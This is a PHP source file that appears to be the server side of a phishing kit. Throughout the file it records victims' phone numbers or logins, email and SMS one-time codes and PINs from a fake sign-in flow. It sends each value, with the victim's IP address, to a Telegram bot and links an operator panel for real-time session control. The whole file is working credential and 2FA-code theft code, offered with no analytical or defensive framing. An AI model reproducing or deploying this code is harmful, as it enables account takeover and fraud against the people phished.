<?php
require_once __DIR__ . '/guard.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.0 404 Not Found');
    exit;
}

// Rate limit: max 1 request per 2 seconds per session
if (isset($_SESSION['last_api_call']) && (time() - $_SESSION['last_api_call']) < 2) {
    http_response_code(429);
    echo json_encode(['error' => 'too_fast']);
    exit;
}
$_SESSION['last_api_call'] = time();

$token = getToken();
if (!$token) {
    header('HTTP/1.0 403 Forbidden');
    exit('No session');
}

$botToken = "6240011";
$chatId = "-79";

function sendTelegram($msg) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=HTML&text=" . urlencode($msg);
    @file_get_contents($url);
}

$ip = getClientIp();
$panelLink = 'https://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/panel.php?pin=hello&view=' . urlencode($token);

// Initialize client if not exists
$db = getDb();
if (!isset($db[$token])) {
    $db[$token] = ['status' => 'online', 'last_seen' => time(), 'last_code' => '', 'email' => '', 'ip' => $ip];
    saveDb($db);
}

$clientData = getClientData($token);
$phone = $clientData['email'] ?? 'N/A';

$type = $_POST['type'] ?? '';

if ($type == 'landing_click') {
    updateClientData($token, ['status' => 'landing_click', 'ip' => $ip]);
    $msg = "<b>🚀 [LOGIN CLICK]</b>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔑 Token:</b> <code>" . substr($token, 0, 8) . "...</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == 'login') {
    $user = $_POST['user'] ?? 'N/A';
    updateClientData($token, ['email' => $user, 'status' => 'login_submitted', 'ip' => $ip]);
    $msg = "<b>👤 [LOGIN]</b>\n<b>📱 Phone:</b> <code>$user</code>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == '2fa_email') {
    $code = $_POST['code'] ?? '------';
    updateClientData($token, ['last_code' => $code, 'status' => 'code_EMAIL']);
    $msg = "<b>📧 [EMAIL OTP]</b>\n<b>📱 Phone:</b> <code>$phone</code>\n<b>🔢 Code:</b> <pre>$code</pre>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == '2fa_sms') {
    $code = $_POST['code'] ?? '------';
    updateClientData($token, ['last_code' => $code, 'status' => 'code_SMS']);
    $msg = "<b>💬 [SMS OTP]</b>\n<b>📱 Phone:</b> <code>$phone</code>\n<b>🔢 Code:</b> <pre>$code</pre>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == 'pin_submit') {
    $pin = $_POST['pin'] ?? '------';
    updateClientData($token, ['last_code' => $pin, 'status' => 'pin_submitted']);
    $msg = "<b>🔢 [PIN]</b>\n<b>📱 Phone:</b> <code>$phone</code>\n<b>🔢 PIN:</b> <pre>$pin</pre>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == 'pin_forgot') {
    updateClientData($token, ['status' => 'pin_forgot']);
    $msg = "<b>❓ [PIN FORGOT]</b>\n<b>📱 Phone:</b> <code>$phone</code>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

if ($type == 'finished') {
    updateClientData($token, ['status' => 'finished_success']);
    $msg = "<b>✅ [SUCCESS]</b>\n<b>📱 Phone:</b> <code>$phone</code>\n<b>🌐 IP:</b> <code>$ip</code>\n<b>🔗 Panel:</b> <a href=\"$panelLink\">Open Panel</a>";
    sendTelegram($msg);
}

echo json_encode(['ok' => true]);
?>